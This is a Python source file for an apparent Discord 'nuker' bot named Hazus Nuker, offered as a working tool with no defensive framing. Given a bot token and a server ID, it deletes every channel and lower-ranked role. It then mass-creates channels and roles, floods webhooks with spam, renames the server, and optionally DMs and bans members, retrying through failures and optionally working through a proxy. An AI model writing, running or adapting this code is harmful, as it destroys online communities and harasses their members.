from discord import *
import aiohttp
import colorama
import asyncio
import configparser
from modules import asynccprint, cprint

def bot_nuker():
    try:
        intents = Intents.default()
        intents.members = True
        intents.guilds = True

        use_proxy = input(colorama.Fore.WHITE + "Use a proxy? (Y/N): ")
        dm_members = input(colorama.Fore.WHITE + "Dm members? (Y/N) ")
        ban_members = input(colorama.Fore.WHITE + "Ban members? (Y/N) ")
        if use_proxy.strip().lower() == "y":
            proxy = input("Input proxy (This should be a single, decent quality proxy for best results): ")
            bot = Bot(intents=intents, proxy=f"http://{proxy}")
        else:
            bot = Bot(intents=intents)

        config = configparser.ConfigParser()
        config.read('config.ini')
        token = config['bot_nuker_config']['bot_token']
        channel_name = config['bot_nuker_config']['channel_name']
        role_name = config['bot_nuker_config']['role_name']
        spam_message = config['bot_nuker_config']['spam_message']
        dm_message = config['bot_nuker_config']['dm_message']
        ban_message = config['bot_nuker_config']['ban_message']
        guild_name = config['bot_nuker_config']['server_name']

        guild_id = int(input("Discord Server ID: "))
        channel_spam_times = int(input("Number of channels to create: "))
        role_spam_times = int(input("Number of roles to create: "))
        message_spam_times = int(input("Number of messages to spam in each channel: "))

        async def delete_channel(channel):
            try:
                await channel.delete()
                await asynccprint(f"Deleted Channel {channel}", 0)
            except:
                await asyncio.sleep(1)
                await delete_channel(channel)
        
        async def delete_role(role):
            try:
                await role.delete()
                await asynccprint(f"Deleted Role {role}", 0)
            except:
                await asyncio.sleep(1)
                await delete_role(role)

        async def spam_webhook(webhook):
                for _ in range(message_spam_times):
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4) as response:
                                if 200 <= response.status <= 299:
                                    await asynccprint(f"Sent message to webhook: {webhook}", 0)
                                else:
                                    await asynccprint(f"Webhook {webhook} is being rate limited.", 1)
                    except Exception as e:
                        print(f"Failed to send message: {e}")
                        await asyncio.sleep(1)

        async def create_webhook(channelid):
            try:
                channel = await bot.fetch_channel(channelid)
                webhook = await channel.create_webhook(name="Hazus Nuker")
                await asynccprint(f"Created Webhook: {webhook.id}", 0)
                await spam_webhook(webhook.url)
            except:
                await asyncio.sleep(1)
                await create_webhook(channelid)

        async def create_channel(guild):
            try:
                new_channel = await guild.create_text_channel(name=channel_name)
                await asynccprint(f"Created Channel: {new_channel.id}", 0)
                await create_webhook(new_channel.id)
            except:
                await asyncio.sleep(1)
                await create_channel(guild)

        async def create_role(guild):
            try:
                new_role = await guild.create_role(name=role_name)
                await asynccprint(f"Created Role: {new_role.id}", 0)
            except:
                await asyncio.sleep(1)
                await create_role(guild)

        async def ban_member(user_id):
            try:
                guild = bot.get_guild(guild_id)
                
                member = guild.get_member(user_id)
                if member is None:
                    member = await guild.fetch_member(user_id)
                
                if member.id == guild.owner_id:
                    return
                
                bot_member = guild.me
                if bot_member.top_role.position > member.top_role.position:
                    await member.ban(reason=ban_message)
                    await asynccprint(f"Banned Member: {user_id}", 0)

            except Exception as e:
                print (e)
                await asyncio.sleep(1)
                await ban_member(user_id)

        async def dm_member(user_id):
            try:
                user = await bot.fetch_user(user_id)
                if user.bot:
                    return
                await user.send(dm_message)
                await asynccprint(f"DM'd Member: {user_id}", 0)
                if ban_members.strip().lower() == 'y':
                    await ban_member(user_id)
            except:
                await asyncio.sleep(1)
                await dm_member(user_id)

        @bot.event
        async def on_ready():

            guild = bot.get_guild(guild_id)

            while True:
                deletable_channels = [channel for channel in guild.channels]
                deletable_roles = [role for role in guild.roles if role < guild.me.top_role and role != guild.default_role]

                if not deletable_channels and not deletable_roles:
                    await asynccprint("All deletable channels and roles have been successfully deleted.", 0)
                    break

                delete_channels = [asyncio.create_task(delete_channel(channel)) for channel in deletable_channels]
                delete_roles = [asyncio.create_task(delete_role(role)) for role in deletable_roles]

                await asyncio.gather(*delete_channels, *delete_roles)

            create_channels = [asyncio.create_task(create_channel(guild)) for _ in range(channel_spam_times)]
            create_roles = [asyncio.create_task(create_role(guild)) for _ in range(role_spam_times)]

            await asyncio.gather(*create_channels, *create_roles)

            await guild.edit(name=guild_name)
            await asynccprint(f"Changed server name to \"{guild_name}\"", 0)

            if dm_members.strip().lower() == 'y':
                members = [member.id for member in guild.members]
                for member in members:
                    await dm_member(member)

            await asynccprint(f"Successfully Nuked {guild_id}", 0)
            await bot.close()

        bot.run(token)
    except Exception as e:
        if use_proxy.strip().lower() == 'y':
            cprint(f"Exception: {e}!\nThere was likely an issue with the proxy try with a different one!", 1)
        else:
            cprint(f"Exception: {e}!", 1)